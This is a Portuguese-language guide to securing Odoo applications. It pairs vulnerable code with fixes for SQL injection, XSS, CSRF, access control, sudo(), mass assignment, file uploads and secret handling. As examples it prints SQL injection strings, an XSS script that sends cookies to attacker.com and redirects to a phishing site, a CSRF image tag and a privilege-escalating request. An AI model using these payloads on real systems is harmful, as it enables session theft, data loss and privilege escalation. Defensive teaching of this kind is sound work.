# 🔒 Odoo Security Best Practices - Guia Definitivo

> **Objetivo:** Garantir segurança máxima em aplicações Odoo
> **Prioridade:** CRÍTICA - Security é não negociável!
> **Data:** 2025-11-17
> **Status:** Conhecimento permanente

---

## ⚠️ AVISO IMPORTANTE

### Odoo 15 - END OF SUPPORT!

**❌ Odoo 15.0 perdeu suporte oficial em Outubro/2024**

**Impacto CRÍTICO:**
- ❌ **Zero security patches** - Vulnerabilidades NÃO serão corrigidas
- ❌ **Zero bug fixes** - Bugs conhecidos permanecerão
- ❌ **Risco crescente** - Cada dia sem migrar aumenta exposição
- ❌ **Compliance issues** - LGPD/GDPR podem ser violados

**AÇÃO URGENTE:**
```
Se está em Odoo 15:
  1. Planejar migração AGORA
  2. Target: v17 ou v18 (estáveis e suportadas)
  3. Timeline: 3-6 meses máximo
  4. Budget: Alocar recursos
  5. Risk: ALTO se não migrar!
```

**Mitigação Temporária (enquanto não migra):**
- Firewall rigoroso (whitelist IPs)
- WAF (Web Application Firewall)
- Monitoring 24/7
- Backups diários (múltiplos)
- Incident response plan
- **Mas MIGRE O MAIS RÁPIDO POSSÍVEL!**

---

## 🎯 FUNDAMENTOS DE SEGURANÇA ODOO

### Os 4 Layers de Segurança

```
1. ACCESS RIGHTS (ir.model.access)
   ↓ "Quem pode acessar qual MODEL?"

2. RECORD RULES (ir.rule)
   ↓ "Quais RECORDS cada usuário vê/edita?"

3. FIELD-LEVEL SECURITY
   ↓ "Quais CAMPOS cada grupo acessa?"

4. BUSINESS LOGIC (Python)
   ↓ "Validações e regras de negócio"
```

**TODOS OS 4 SÃO OBRIGATÓRIOS!**

---

## 🔥 VULNERABILIDADE #1: SQL INJECTION (CRÍTICO!)

### O Perigo

```python
# ❌ CÓDIGO VULNERÁVEL (NUNCA FAÇA ISSO!)
user_input = request.params['name']
query = f"SELECT * FROM res_partner WHERE name = '{user_input}'"
self.env.cr.execute(query)
```

**Exploit:**
```
Input malicioso: ' OR '1'='1
Query resultante: SELECT * FROM res_partner WHERE name = '' OR '1'='1'
Resultado: TODOS os registros retornados! 💀
```

**Exploits piores:**
```
Input: '; DROP TABLE res_partner; --
Resultado: TABELA DELETADA! 😱

Input: ' UNION SELECT email, password FROM res_users --
Resultado: SENHAS VAZADAS! ☠️
```

---

### SOLUÇÃO: Parametrized Queries (SEMPRE!)

**✅ CÓDIGO SEGURO:**

```python
# Opção 1: Tupla de parâmetros (RECOMENDADO)
user_input = request.params['name']
self.env.cr.execute(
    "SELECT * FROM res_partner WHERE name = %s",
    (user_input,)  # TUPLA! Mesmo para 1 parâmetro
)

# Opção 2: Lista de parâmetros
self.env.cr.execute(
    "SELECT * FROM res_partner WHERE name = %s AND active = %s",
    [user_input, True]
)

# Opção 3: Dict de parâmetros (nomeados)
self.env.cr.execute(
    "SELECT * FROM res_partner WHERE name = %(name)s AND city = %(city)s",
    {'name': user_input, 'city': user_city}
)
```

**Por que funciona:**
- PostgreSQL escapa valores automaticamente
- Impossível injetar SQL
- `%s` é placeholder, NÃO f-string format!

---

### CHECKLIST SQL Injection

```
[ ] NUNCA usar f-string para queries
[ ] NUNCA usar string concatenation (+)
[ ] NUNCA usar % formatting
[ ] SEMPRE usar %s placeholders
[ ] SEMPRE passar valores como tupla/lista/dict
[ ] Code review OBRIGATÓRIO para todo execute()
[ ] Linter automático (pylint-odoo)
```

**Exceção (RARO):**
```python
# Se REALMENTE precisa interpolar table/column names (não valores!):
from psycopg2 import sql

table = sql.Identifier('res_partner')
field = sql.Identifier('name')

self.env.cr.execute(
    sql.SQL("SELECT {field} FROM {table} WHERE active = %s").format(
        field=field,
        table=table
    ),
    (True,)  # Valores SEMPRE parametrizados!
)
```

---

## 🔥 VULNERABILIDADE #2: XSS (Cross-Site Scripting)

### O Perigo

```python
# ❌ VULNERÁVEL
description = "<script>alert('XSS!')</script>"
partner.write({'comment': description})
```

**View:**
```xml
<!-- ❌ VULNERÁVEL -->
<span t-raw="partner.comment"/>
<!-- Executa JavaScript! 😱 -->
```

**Exploit real:**
```javascript
<script>
  // Rouba session token
  fetch('http://attacker.com/steal?token=' + document.cookie);
  // Redireciona para phishing
  window.location = 'http://fake-odoo.com/login';
</script>
```

---

### SOLUÇÃO: Escaping Automático

**QWeb escapa automaticamente:**

```xml
<!-- ✅ SEGURO - Escapado automaticamente -->
<span t-field="partner.comment"/>
<span t-esc="partner.comment"/>

<!-- Resultado: &lt;script&gt;alert('XSS')&lt;/script&gt; -->
<!-- Mostra como texto, não executa! ✅ -->

<!-- ❌ PERIGOSO - Não escapado -->
<span t-raw="partner.comment"/>
<!-- SÓ usar se conteúdo já foi sanitizado! -->
```

**Quando usar t-raw:**

```xml
<!-- OK: Conteúdo vem de field html (sanitizado pelo Odoo) -->
<div t-raw="product.description_sale"/>

<!-- OK: Conteúdo hardcoded (sem user input) -->
<div t-raw="'<strong>Bold Text</strong>'"/>

<!-- ❌ NUNCA: User input direto -->
<div t-raw="partner.notes"/>  <!-- PERIGO! -->
```

---

### Sanitização em Python

```python
from markupsafe import Markup, escape

# ❌ PERIGOSO
description_html = f"<p>{user_input}</p>"

# ✅ SEGURO - Opção 1: Escape manual
description_html = Markup("<p>%s</p>") % escape(user_input)

# ✅ SEGURO - Opção 2: tools.html_sanitize
from odoo.tools import html_sanitize

description_html = html_sanitize(user_input, silent=False)
# Remove scripts, iframes, event handlers, etc
```

**Odoo tools.html_sanitize:**
```python
# Whitelist de tags/attributes seguros
safe_html = html_sanitize("""
    <p>Texto normal</p>
    <strong>Negrito</strong>
    <a href="https://odoo.com">Link</a>
    <script>alert('XSS')</script>  <!-- REMOVIDO! -->
    <img src=x onerror="alert('XSS')">  <!-- onerror REMOVIDO! -->
""")

# Resultado: Apenas tags seguras mantidas
```

---

### HTML Fields - Cuidados

```python
class MyModel(models.Model):
    _name = 'my.model'

    # Field Html tem sanitização built-in
    description = fields.Html(
        string='Description',
        sanitize=True,  # ✅ DEFAULT - SEMPRE deixar True!
        sanitize_tags=True,  # Remove tags perigosas
        sanitize_attributes=True,  # Remove atributos perigosos
        sanitize_style=False,  # Permite CSS inline (use com cuidado)
        strip_style=False,  # Remove TODOS os styles
        strip_classes=False  # Remove TODAS as classes
    )
```

**Configuração recomendada:**
```python
# ✅ Seguro para user input
description = fields.Html(sanitize=True, strip_style=True)

# ⚠️ Para admin/trusted users apenas
description = fields.Html(sanitize=True, sanitize_style=False)

# ❌ NUNCA desabilitar sanitização com user input!
description = fields.Html(sanitize=False)  # PERIGO!
```

---

## 🔥 VULNERABILIDADE #3: CSRF (Cross-Site Request Forgery)

### O Perigo

**Atacante cria página maliciosa:**
```html
<!-- evil-site.com -->
<img src="https://your-odoo.com/web/dataset/call_kw/res.partner/unlink?ids=[1,2,3]">
```

**Se usuário autenticado visita:**
- Request é enviado com cookies válidos
- Odoo pensa que é request legítimo
- Partners deletados! 😱

---

### SOLUÇÃO: CSRF Tokens (Built-in)

**Odoo protege automaticamente:**

```python
# Controllers HTTP tem CSRF protection automático
from odoo import http

class MyController(http.Controller):

    @http.route('/my/endpoint', type='http', auth='user', csrf=True)
    def my_endpoint(self, **kwargs):
        # CSRF token validado automaticamente! ✅
        pass

    @http.route('/api/public', type='json', auth='public', csrf=False)
    def public_api(self, **kwargs):
        # ⚠️ csrf=False - Use APENAS para APIs públicas!
        # E valide outro método (API key, etc)
        pass
```

**Forms HTML:**
```html
<!-- Token incluído automaticamente em forms -->
<form action="/my/action" method="POST">
    <input type="hidden" name="csrf_token" t-att-value="request.csrf_token()"/>
    <!-- ... -->
</form>
```

---

### Quando Desabilitar CSRF (CUIDADO!)

**✅ OK desabilitar SE:**
- API pública com autenticação própria (API key, OAuth)
- Webhook receivers
- CORS configurado corretamente

**❌ NUNCA desabilitar SE:**
- User pode fazer login
- Modifica dados
- Sem autenticação alternativa

---

## 🔥 VULNERABILIDADE #4: ACCESS CONTROL BYPASS

### Access Rights (ir.model.access.csv)

**Anatomia:**

```csv
id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink
access_partner_user,res.partner.user,model_res_partner,base.group_user,1,1,1,0
```

**Campos:**
- `perm_read`: Pode ler? (1=Yes, 0=No)
- `perm_write`: Pode editar? (1=Yes, 0=No)
- `perm_create`: Pode criar? (1=Yes, 0=No)
- `perm_unlink`: Pode deletar? (1=Yes, 0=No)

---

### CUIDADOS Críticos:

**❌ ERRO COMUM #1: Dar permissões demais**
```csv
# ❌ PERIGOSO - User pode deletar partners!
access_partner_user,partner.user,model_res_partner,base.group_user,1,1,1,1

# ✅ CORRETO - User NÃO pode deletar
access_partner_user,partner.user,model_res_partner,base.group_user,1,1,1,0
```

**❌ ERRO COMUM #2: Esquecer access rights**
```python
# Modelo novo criado, mas sem ir.model.access.csv
# Resultado: NINGUÉM acessa (nem admin)! 🔒
```

**✅ SOLUÇÃO: SEMPRE criar access rights**
```csv
# Mínimo: Admin tem acesso total
access_mymodel_admin,my.model.admin,model_my_model,base.group_system,1,1,1,1

# Users normais
access_mymodel_user,my.model.user,model_my_model,base.group_user,1,1,1,0
```

---

### Record Rules (ir.rule)

**Filtram QUAIS records cada usuário vê:**

```xml
<record id="rule_lead_own" model="ir.rule">
    <field name="name">Own Leads Only</field>
    <field name="model_id" ref="crm.model_crm_lead"/>
    <field name="domain_force">[('user_id', '=', user.id)]</field>
    <field name="groups" eval="[(4, ref('sales_team.group_sale_salesman'))]"/>
    <field name="perm_read" eval="True"/>
    <field name="perm_write" eval="True"/>
    <field name="perm_create" eval="True"/>
    <field name="perm_unlink" eval="False"/>
</record>
```

**Resultado:**
- Vendedor vê apenas SUAS leads
- Pode ler/escrever/criar
- NÃO pode deletar

---

**Multi-Rules (AND lógico):**
```xml
<!-- Rule 1: Apenas company própria -->
<record id="rule_company" model="ir.rule">
    <field name="domain_force">[('company_id', '=', user.company_id.id)]</field>
</record>

<!-- Rule 2: Apenas leads ativas -->
<record id="rule_active" model="ir.rule">
    <field name="domain_force">[('active', '=', True)]</field>
</record>

<!-- Resultado: company própria AND ativa (ambas aplicadas!) -->
```

---

**Global vs Group Rules:**
```xml
<!-- Global rule (aplica para TODOS, sem group) -->
<record id="rule_global" model="ir.rule">
    <field name="model_id" ref="crm.model_crm_lead"/>
    <field name="domain_force">[('company_id', 'in', company_ids)]</field>
    <field name="groups" eval="[]"/>  <!-- VAZIO = Global! -->
    <field name="global" eval="True"/>
</record>

<!-- Group rule (apenas para vendedores) -->
<record id="rule_salesman" model="ir.rule">
    <field name="model_id" ref="crm.model_crm_lead"/>
    <field name="domain_force">[('user_id', '=', user.id)]</field>
    <field name="groups" eval="[(4, ref('sales_team.group_sale_salesman'))]"/>
</record>
```

---

### sudo() - O PERIGO! ⚠️

**sudo() BYPASSA TUDO:**
```python
# Sem sudo - Record rules aplicadas
leads = self.env['crm.lead'].search([])
# Vendedor vê apenas SUAS leads (rule aplicada)

# Com sudo - BYPASSA record rules!
leads = self.env['crm.lead'].sudo().search([])
# Vendedor vê TODAS as leads! 😱
```

**Quando usar sudo():**

**✅ OK usar SE:**
```python
# 1. Sistema precisa acessar dados (cron jobs, background tasks)
def _cron_cleanup_old_data(self):
    old_records = self.env['my.model'].sudo().search([
        ('create_date', '<', cutoff_date)
    ])
    old_records.unlink()

# 2. Criar records como admin (signup, imports)
def signup_user(self, email):
    user = self.env['res.users'].sudo().create({
        'login': email,
        'name': 'New User'
    })

# 3. Ler configurações (ir.config_parameter)
param = self.env['ir.config_parameter'].sudo().get_param('my.setting')
```

**❌ NUNCA usar SE:**
```python
# ❌ User request direto (BYPASS security!)
def get_all_partners(self):
    return self.env['res.partner'].sudo().search([])
    # User vê TODOS partners, ignorando record rules! PERIGOSO!

# ✅ CORRETO - Respeita security
def get_all_partners(self):
    return self.env['res.partner'].search([])
    # User vê apenas partners permitidos pelas rules ✅
```

---

**sudo(False) para voltar:**
```python
# Elevate para sudo
partners_sudo = self.env['res.partner'].sudo()

# Faz operação privilegiada
admin_partner = partners_sudo.create({'name': 'Admin'})

# Volta para user normal
partners_normal = partners_sudo.sudo(False)
```

---

## 🔥 VULNERABILIDADE #5: MASS ASSIGNMENT

### O Perigo

```python
# ❌ VULNERÁVEL - User pode setar QUALQUER campo!
@http.route('/update/profile', type='json', auth='user')
def update_profile(self, **kwargs):
    self.env.user.write(kwargs)  # PERIGOSO!
```

**Exploit:**
```javascript
// Atacante envia:
fetch('/update/profile', {
    method: 'POST',
    body: JSON.stringify({
        name: 'Hacker',
        groups_id: [[6, 0, [1, 2, 3]]],  // Adiciona a grupos admin!
        active: false  // Desativa outros users!
    })
})
```

---

### SOLUÇÃO: Whitelist Explícito

```python
# ✅ SEGURO - Apenas campos permitidos
ALLOWED_FIELDS = ['name', 'email', 'phone', 'image']

@http.route('/update/profile', type='json', auth='user')
def update_profile(self, **kwargs):
    # Filter apenas campos permitidos
    safe_values = {
        key: val
        for key, val in kwargs.items()
        if key in ALLOWED_FIELDS
    }

    # Validar valores
    if 'email' in safe_values:
        if not self._validate_email(safe_values['email']):
            raise UserError(_('Invalid email!'))

    self.env.user.write(safe_values)
```

---

### Field-Level Security (Groups)

```python
class ResPartner(models.Model):
    _inherit = 'res.partner'

    # Campo visível apenas para managers
    internal_notes = fields.Text(
        groups='sales_team.group_sale_manager'
    )

    # Campo visível apenas para admin
    credit_limit = fields.Float(
        groups='base.group_system'
    )
```

**Comportamento:**
- User normal: campo NÃO aparece no form
- User normal: write() no campo é IGNORADO silenciosamente
- Manager/Admin: campo aparece e é editável

---

## 🔥 VULNERABILIDADE #6: INFORMATION DISCLOSURE

### Evitar Vazamento de Informações

**❌ ERRO: Mensagens detalhadas demais**
```python
# ❌ VULNERÁVEL
try:
    partner = self.env['res.partner'].browse(partner_id)
    if not partner.exists():
        raise UserError(_('Partner with ID %s does not exist!') % partner_id)
        # Revela se ID existe ou não (enumeration attack!)
except Exception as e:
    raise UserError(_('Error: %s') % str(e))
    # Revela stack trace, paths, DB structure! 😱
```

**✅ CORRETO: Mensagens genéricas**
```python
# ✅ SEGURO
try:
    partner = self.env['res.partner'].browse(partner_id)
    if not partner.exists():
        raise UserError(_('Invalid partner'))
        # Mensagem genérica, sem detalhes
except AccessError:
    raise UserError(_('Access denied'))
except Exception:
    _logger.exception('Error accessing partner %s', partner_id)
    raise UserError(_('An error occurred. Please contact support.'))
    # Log detalhado para admin, mensagem genérica para user
```

---

### Logging Seguro

**❌ NUNCA logar senhas/tokens:**
```python
# ❌ PERIGOSO
_logger.info('User login: %s, password: %s', login, password)
# Senha no log file! 😱

# ❌ PERIGOSO
_logger.info('API response: %s', response.text)
# Pode conter tokens, credit cards, etc!
```

**✅ SEMPRE mascarar dados sensíveis:**
```python
# ✅ SEGURO
_logger.info('User login attempt: %s', login)
# Sem senha!

# ✅ SEGURO
_logger.info('API response status: %s', response.status_code)
# Apenas status, não body

# ✅ SEGURO - Mascarar parcialmente
def mask_credit_card(card_number):
    return f"****-****-****-{card_number[-4:]}"

_logger.info('Payment with card: %s', mask_credit_card(card))
```

---

### Error Messages - User vs Admin

```python
# Different error messages for user vs admin
def process_payment(self):
    try:
        # Payment processing
        api_response = payment_provider.charge(...)
        if not api_response.success:
            # User message: generic
            error_msg = _('Payment failed. Please try again or contact support.')

            # Admin log: detailed
            _logger.error(
                'Payment failed for order %s. '
                'Provider: %s, Error code: %s, Message: %s',
                self.name,
                payment_provider.name,
                api_response.error_code,
                api_response.error_message
            )

            raise UserError(error_msg)

    except Exception:
        _logger.exception('Unexpected error processing payment for %s', self.name)
        raise UserError(_('An unexpected error occurred. Reference: %s') % self.name)
```

---

## 🔥 VULNERABILIDADE #7: INSECURE FILE UPLOADS

### Validação de Upload

```python
from odoo.exceptions import ValidationError
import magic  # python-magic library

ALLOWED_EXTENSIONS = ['pdf', 'png', 'jpg', 'jpeg', 'docx', 'xlsx']
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

@api.constrains('attachment_id')
def _check_attachment(self):
    for record in self:
        if not record.attachment_id:
            continue

        # 1. Check file size
        if record.attachment_id.file_size > MAX_FILE_SIZE:
            raise ValidationError(_('File too large! Max: 10 MB'))

        # 2. Check extension
        filename = record.attachment_id.name or ''
        ext = filename.split('.')[-1].lower()
        if ext not in ALLOWED_EXTENSIONS:
            raise ValidationError(_('File type not allowed! Allowed: %s') % ', '.join(ALLOWED_EXTENSIONS))

        # 3. Check MIME type (não confiar apenas na extensão!)
        datas = base64.b64decode(record.attachment_id.datas)
        mime = magic.from_buffer(datas, mime=True)
        allowed_mimes = ['application/pdf', 'image/png', 'image/jpeg', ...]
        if mime not in allowed_mimes:
            raise ValidationError(_('Invalid file content!'))
            # Previne upload de .exe renomeado para .pdf!

        # 4. Sanitizar filename
        safe_filename = self._sanitize_filename(filename)
        if safe_filename != filename:
            record.attachment_id.name = safe_filename

def _sanitize_filename(self, filename):
    # Remove path traversal (../, etc)
    import os
    filename = os.path.basename(filename)

    # Remove caracteres perigosos
    import re
    filename = re.sub(r'[^\w\s.-]', '', filename)

    return filename
```

---

### Executar Vírus Scan (Produção)

```python
# Integração com ClamAV
import pyclamd

def _scan_file(self, file_data):
    """Scan file for viruses"""
    try:
        cd = pyclamd.ClamdUnixSocket()
        # Scan
        result = cd.scan_stream(file_data)
        if result:
            # Virus found!
            raise ValidationError(_('File contains malware! Upload blocked.'))
    except Exception as e:
        _logger.error('Virus scan failed: %s', e)
        # Decidir: permitir ou bloquear se scan falhar?
        # Recomendado: BLOQUEAR (fail-safe)
        raise ValidationError(_('File could not be verified. Upload blocked.'))
```

---

## 🔥 VULNERABILIDADE #8: SENSITIVE DATA EXPOSURE

### Passwords & Secrets

**❌ NUNCA:**
```python
# ❌ HARDCODED PASSWORD
DATABASE_PASSWORD = 'MyP@ssw0rd123'

# ❌ PASSWORD NO CODE
partner.write({'password': 'temporary123'})

# ❌ PASSWORD NO LOG
_logger.info('Login %s with password %s', login, password)
```

**✅ SEMPRE:**
```python
# ✅ Environment variables
import os
DATABASE_PASSWORD = os.getenv('DB_PASSWORD')

# ✅ ir.config_parameter (criptografado)
api_key = self.env['ir.config_parameter'].sudo().get_param('api.key')

# ✅ Hashed passwords
from passlib.context import CryptContext

pwd_context = CryptContext(schemes=['pbkdf2_sha512'], deprecated='auto')
hashed = pwd_context.hash('plaintext_password')
# Armazenar apenas hash, NUNCA plaintext!
```

---

### Database Encryption

**Campos sensíveis:**
```python
# Credit card numbers
credit_card = fields.Char(groups='base.group_system')
# ⚠️ Ainda fica em plaintext no DB!

# Solução: Encryption
from cryptography.fernet import Fernet

class EncryptedChar(fields.Char):
    """Encrypted Char field"""

    def convert_to_column(self, value, record, values=None, validate=True):
        # Encrypt before storing
        if value:
            cipher = Fernet(ENCRYPTION_KEY)
            value = cipher.encrypt(value.encode()).decode()
        return super().convert_to_column(value, record, values, validate)

    def convert_to_cache(self, value, record, validate=True):
        # Decrypt when reading
        if value:
            cipher = Fernet(ENCRYPTION_KEY)
            value = cipher.decrypt(value.encode()).decode()
        return super().convert_to_cache(value, record, validate)

# Usage
credit_card = EncryptedChar()
```

---

### HTTPS Obrigatório

**nginx config:**
```nginx
server {
    listen 80;
    server_name odoo.example.com;

    # Redirect HTTP → HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name odoo.example.com;

    # SSL Certificate
    ssl_certificate /etc/letsencrypt/live/odoo.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/odoo.example.com/privkey.pem;

    # SSL Configuration (Mozilla Intermediate)
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256...';
    ssl_prefer_server_ciphers off;

    # HSTS
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

    # Proxy to Odoo
    location / {
        proxy_pass http://localhost:8069;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Proto https;
        proxy_set_header Host $host;
    }
}
```

---

## 📋 SECURITY CHECKLIST

### Desenvolvimento

```
[ ] SQL queries SEMPRE parametrizadas (%s)?
[ ] User input SEMPRE escapado em views?
[ ] html fields com sanitize=True?
[ ] Mass assignment protegido (whitelist)?
[ ] sudo() usado apenas quando necessário?
[ ] Passwords NUNCA em plaintext?
[ ] Secrets em environment vars ou ir.config_parameter?
[ ] File uploads validados (size, extension, MIME)?
[ ] Error messages genéricos para users?
[ ] Logging NÃO contém dados sensíveis?
```

### Segurança de Modelo

```
[ ] ir.model.access.csv criado para todos models?
[ ] Record rules definidas?
[ ] Apenas permissões necessárias (least privilege)?
[ ] Fields sensíveis com groups?
[ ] @api.constrains para validações?
[ ] Tests de security (bypass attempts)?
```

### Produção

```
[ ] HTTPS obrigatório (redirect HTTP)?
[ ] SSL certificate válido (Let's Encrypt)?
[ ] HSTS header habilitado?
[ ] WAF configurado (Cloudflare, ModSecurity)?
[ ] Firewall restritivo (whitelist IPs)?
[ ] Database backups criptografados?
[ ] Logs centralizados e monitorados?
[ ] Incident response plan documentado?
[ ] Security updates aplicados (Odoo + OS)?
[ ] Penetration testing regular (6-12 meses)?
```

### Compliance (LGPD/GDPR)

```
[ ] Dados pessoais identificados?
[ ] Consent tracking implementado?
[ ] Right to erasure (delete user data)?
[ ] Data portability (export user data)?
[ ] Privacy policy publicada?
[ ] Data retention policy definida?
[ ] Data breach notification process?
[ ] DPO (Data Protection Officer) designado?
```

---

## 🎯 QUICK WINS SECURITY

### Top 5 Ações Imediatas

**1. Fix SQL Injection (ROI: 🔒🔒🔒🔒🔒)**
```
Esforço: 1-2 dias
Impacto: CRÍTICO
Prioridade: URGENTÍSSIMA!
```

**2. Enable HTTPS (ROI: 🔒🔒🔒🔒)**
```
Esforço: 2-4 horas
Impacto: ALTO
Prioridade: URGENTE
```

**3. Review Access Rights (ROI: 🔒🔒🔒)**
```
Esforço: 1 dia
Impacto: ALTO
Prioridade: ALTA
```

**4. Sanitize User Input (ROI: 🔒🔒🔒🔒)**
```
Esforço: 2-3 dias
Impacto: ALTO
Prioridade: ALTA
```

**5. Remove sudo() Desnecessários (ROI: 🔒🔒🔒)**
```
Esforço: 1 dia
Impacto: MÉDIO
Prioridade: MÉDIA
```

---

## 🎓 LIÇÕES APRENDIDAS

1. **SQL Injection é o #1 risco** - SEMPRE parametrizar!
2. **sudo() é perigoso** - Usar apenas quando necessário
3. **XSS é comum** - html_sanitize() é seu amigo
4. **HTTPS é obrigatório** - Não é opcional!
5. **Access rights não bastam** - Record rules também!
6. **Passwords NUNCA plaintext** - Hash sempre!
7. **File uploads são vetores** - Validar TUDO!
8. **Error messages vazam info** - Ser genérico
9. **Logging pode expor** - Mascarar sensitivos
10. **Odoo 15 sem suporte = RISCO** - Migrar urgente!

---

**Criado:** 2025-11-17
**Sprint:** 4 - Auto-Educação Odoo
**Prioridade:** 🔴 CRÍTICA
**Próxima revisão:** Mensal ou após incident

**Ver também:**
- [Common Errors v15](./common-errors-15.md)
- [Performance Patterns](./performance-patterns.md)
- [What's New v18](./whats-new-18.md)

🔒 **SECURITY IS NOT OPTIONAL! STAY SAFE!** 🔒
